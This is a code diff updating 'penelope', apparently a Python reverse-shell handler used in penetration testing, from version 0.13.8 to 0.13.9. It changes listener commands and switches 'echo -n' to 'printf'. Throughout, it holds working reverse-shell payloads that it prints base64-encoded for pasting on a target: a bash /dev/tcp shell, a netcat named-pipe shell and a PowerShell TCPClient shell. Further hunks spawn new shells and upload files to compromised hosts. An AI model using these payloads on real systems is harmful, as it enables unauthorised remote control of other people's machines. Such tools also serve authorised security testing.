@@ -16,7 +16,7 @@
 # along with this program.  If not, see <https://www.gnu.org/licenses/>.
 
 __program__= "penelope"
-__version__ = "0.13.8"
+__version__ = "0.13.9"
 
 import os
 import io
@@ -1254,14 +1254,14 @@ class MainMenu(BetterCMD):
 
 	def do_listeners(self, line):
 		"""
-		[<add|stop> <Iface|IP> <Port>]
+		[<add|stop>[-i <iface>][-p <port>]]
 		Add / stop / view Listeners
 
 		Examples:
 
 			listeners			Show active Listeners
-			listeners add any 4444		Create a Listener on 0.0.0.0:4444
-			listeners stop 0.0.0.0 4444	Stop the Listener on 0.0.0.0:4444
+			listeners add -i any -p 4444	Create a Listener on 0.0.0.0:4444
+			listeners stop 1		Stop the Listener with ID 1
 		"""
 		if line:
 			parser = ArgumentParser(prog="listeners")
@@ -1874,8 +1874,8 @@ class TCPListener:
 	def payloads(self):
 		interfaces = Interfaces().list
 		presets = [
-			"setsid bash >& /dev/tcp/{}/{} 0>&1 &",
-			"rm /tmp/_;mkfifo /tmp/_;cat /tmp/_|sh 2>&1|nc {} {} >/tmp/_ &",
+			"(bash >& /dev/tcp/{}/{} 0>&1) &",
+			"(rm /tmp/_;mkfifo /tmp/_;cat /tmp/_|sh 2>&1|nc {} {} >/tmp/_) &",
 			'$client = New-Object System.Net.Sockets.TCPClient("{}",{});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()' # Taken from revshells.com
 		]
 
@@ -1889,10 +1889,13 @@ class TCPListener:
 		for ip in ips:
 			iface_name = {v: k for k, v in interfaces.items()}.get(ip)
 			output.extend((f'➤  {str(paint(iface_name).GREEN)} → {str(paint(ip).cyan)}:{str(paint(self.port).red)}', ''))
-			output.append(f"echo -n {base64.b64encode(presets[0].format(ip, self.port).encode()).decode()}|base64 -d|bash")
+			output.append(str(paint("Bash TCP").UNDERLINE))
+			output.append(f"printf {base64.b64encode(presets[0].format(ip, self.port).encode()).decode()}|base64 -d|bash")
 			output.append("")
-			output.append(f"echo -n {base64.b64encode(presets[1].format(ip, self.port).encode()).decode()}|base64 -d|sh")
+			output.append(str(paint("Netcat + named pipe").UNDERLINE))
+			output.append(f"printf {base64.b64encode(presets[1].format(ip, self.port).encode()).decode()}|base64 -d|sh")
 			output.append("")
+			output.append(str(paint("Powershell").UNDERLINE))
 			output.append("cmd /c powershell -e " + base64.b64encode(presets[2].format(ip, self.port).encode("utf-16le")).decode())
 
 			output.extend(dedent(f"""
@@ -2118,10 +2121,11 @@ class Session:
 				_bin = self.bin['python3'] or self.bin['python']
 				if _bin:
 					version = self.exec(f"{_bin} -V 2>&1 || {_bin} --version 2>&1", value=True)
-					if not version: # TEMP patch
+					try:
+						major, minor, micro = re.search(r"Python (\d+)\.(\d+)(?:\.(\d+))?", version).groups()
+					except:
 						self._can_deploy_agent = False
 						return self._can_deploy_agent
-					major, minor, micro = re.search(r"Python (\d+)\.(\d+)(?:\.(\d+))?", version).groups()
 					self.remote_python_version = (int(major), int(minor), int(micro))
 					if self.remote_python_version >= (2, 3): # Python 2.2 lacks: tarfile, os.walk, yield
 						self._can_deploy_agent = True
@@ -2219,7 +2223,7 @@ class Session:
 
 	def get_tty(self, silent=False):
 		response = self.exec("tty", agent_typing=True, value=True) # TODO check binary
-		if not (isinstance(response, str) and '/' in response):
+		if not (isinstance(response, str) and response.startswith('/')):
 			if not silent:
 				logger.error(f"Cannot get the TTY of the shell. Response:\r\n{paint(response).white}")
 			return False
@@ -2651,9 +2655,9 @@ class Session:
 					if self.OS == 'Unix':
 						cmd = (
 							f" {token[0]}={token[1]} {token[2]}={token[3]};"
-							f"echo -n ${token[0]}${token[2]};"
+							f"printf ${token[0]}${token[2]};"
 							f"{cmd.decode()};"
-							f"echo -n ${token[2]}${token[0]}\n".encode()
+							f"printf ${token[2]}${token[0]}\n".encode()
 						)
 
 					elif self.OS == 'Windows': # TODO fix logic
@@ -3524,7 +3528,7 @@ class Session:
 				temp = self.tmp + "/" + rand(8)
 
 				for chunk in chunks(data, options.upload_chunk_size):
-					response = self.exec(f"echo -n {chunk} >> {temp}")
+					response = self.exec(f"printf {chunk} >> {temp}")
 					if response is False:
 						#progress_bar.terminate()
 						logger.error("Upload interrupted")
@@ -3533,7 +3537,7 @@ class Session:
 
 				#logger.info(paint("--- Remote unpacking...").blue)
 				dest = f"-C {remote_path}" if remote_path else ""
-				cmd = f"base64 -d {temp} | tar xz {dest} 2>&1; temp=$?"
+				cmd = f"base64 -d < {temp} | tar xz {dest} 2>&1; temp=$?"
 				response = self.exec(cmd, value=True)
 				exit_code = int(self.exec("echo $temp", value=True))
 				self.exec(f"rm {temp}")
@@ -3670,7 +3674,7 @@ class Session:
 					new_listener = TCPListener(host, port)
 
 				if self.bin['bash']:
-					cmd = f'echo -n "{self.bin["setsid"]} {self.bin["bash"]} >& /dev/tcp/{host}/{port} 0>&1 &"|{self.bin["bash"]}'
+					cmd = f'printf "{self.bin["setsid"]} {self.bin["bash"]} >& /dev/tcp/{host}/{port} 0>&1 &"|{self.bin["bash"]}'
 				elif self.bin['nc']:
 					cmd = f'sh -c \'rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | {self.bin["sh"]} 2>&1 | nc {host} {port} > /tmp/f &\''
 				elif self.bin['sh']:
